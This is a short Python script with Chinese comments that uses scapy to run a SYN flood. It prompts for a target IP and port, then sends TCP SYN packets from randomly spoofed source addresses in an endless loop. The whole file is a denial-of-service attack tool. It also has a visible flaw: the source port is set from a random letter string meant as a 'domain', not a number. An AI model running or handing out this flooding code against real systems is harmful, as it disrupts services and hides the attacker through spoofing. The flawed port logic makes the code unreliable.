# 导入scapy库
from scapy.all import *

# 定义一个函数，用于生成随机IP地址
def random_ip():
  # 生成四个0-255之间的随机数，作为IP地址的四个段
  ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
  return ip

# 定义一个函数，用于生成随机域名
def random_domain():
  # 定义一个包含26个字母的字符串
  alphabet = "abcdefghijklmnopqrstuvwxyz"
  # 随机选择一个1-10之间的数，作为域名的长度
  length = random.randint(1, 10)
  # 随机从字母中选择length个字符，作为域名
  domain = "".join(random.choices(alphabet, k=length))
  return domain

# 启动时要求输入目标IP和端口
target_ip = input("请输入目标IP地址：")
target_port = int(input("请输入目标端口号："))

# 使用无限循环，不断发送SYN包
while True:
  try:
    # 使用随机IP和域名作为源地址和源端口
    source_ip = random_ip()
    source_port = random_domain()
    # 构造一个TCP包，设置SYN标志位为1，表示发起连接请求
    packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
    # 发送这个包，并不等待回应
    send(packet, verbose=False)
    # 打印发送的信息
    print(f"发送了一个SYN包，源地址为{source_ip}:{source_port}，目标地址为{target_ip}:{target_port}")
  except Exception as e:
    # 对程序产生的错误进行捕获，并打印错误信息
    print(f"发生了一个错误：{e}")
